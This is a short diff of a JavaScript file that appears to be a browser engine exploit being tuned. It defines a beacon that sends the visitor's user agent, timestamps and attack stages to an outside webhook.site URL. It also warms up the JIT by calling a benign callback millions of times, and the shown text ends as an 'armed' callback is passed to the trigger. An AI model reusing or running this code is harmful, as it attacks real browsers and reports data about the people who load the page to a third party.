@@ -4,7 +4,7 @@ const SINK = 'https://webhook.site/a02901c5-1463-4d49-8c93-b651b9c35595/';
 function beacon(t, v){
   try { fetch(SINK + '?t=' + encodeURIComponent(t) + '&v=' + encodeURIComponent(String(v).slice(0,200)), {mode:'no-cors'}); } catch(e) {}
 }
-beacon('start', navigator.userAgent.slice(0,40));
+beacon('t0', String(Date.now())); beacon('start', navigator.userAgent.slice(0,40));
 
 const object1 = {};
 object1.a = 1;
@@ -34,8 +34,8 @@ function trigger(callback) {
 }
 function benign() { }
 
-for (var i = 0; i < 300000; i++) trigger(benign);
-beacon('stage', 'warm-30k');
+for (var i = 0; i < 3000000; i++) trigger(benign);
+beacon('stage', 'warm-300000');
 
 beacon('pre-fire', 'armed');
 trigger(function () {
